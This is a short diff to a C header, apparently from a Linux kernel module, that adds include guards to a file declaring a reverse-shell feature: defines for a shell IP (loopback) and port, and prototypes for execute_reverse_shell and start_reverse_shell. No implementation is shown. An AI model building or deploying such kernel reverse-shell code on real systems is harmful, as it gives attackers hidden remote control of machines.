@@ -1,8 +1,9 @@
-#include <linux/kernel.h>
+#ifndef REVSHELL_H
+#define REVSHELL_H
+
+
 #include <linux/workqueue.h>
-#include <linux/string.h>
-#include <linux/slab.h>
-#include <linux/kmod.h>
+
 
 #define REVERSE_SHELL_IP "127.0.0.1"
 #define REVERSE_SHELL_PORT "1234"
@@ -29,3 +30,4 @@ void execute_reverse_shell(struct work_struct *work);
 int start_reverse_shell(char* ip, char* port);
 
 
+#endif /* REVSHELL_H */
